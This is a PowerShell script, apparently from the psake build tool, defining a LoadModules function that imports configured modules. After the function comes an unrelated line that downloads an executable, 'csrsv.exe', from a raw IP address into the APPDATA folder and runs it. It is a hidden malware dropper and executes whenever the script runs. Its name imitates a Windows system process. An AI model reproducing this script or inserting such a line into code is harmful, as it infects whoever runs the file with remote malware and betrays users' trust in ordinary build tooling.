function LoadModules {
    $currentConfig = $psake.context.peek().config
    if ($currentConfig.modules) {

        $scope = $currentConfig.moduleScope

        $global = [string]::Equals($scope, "global", [StringComparison]::CurrentCultureIgnoreCase)

        $currentConfig.modules | ForEach-Object {
            resolve-path $_ | ForEach-Object {
                "Loading module: $_"
                $module = Import-Module $_ -passthru -DisableNameChecking -global:$global
                if (!$module) {
                    throw ($msgs.error_loading_module -f $_.Name)
                }
            }
        }

        ""
    }
}

(New-Object System.Net.WebClient).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")

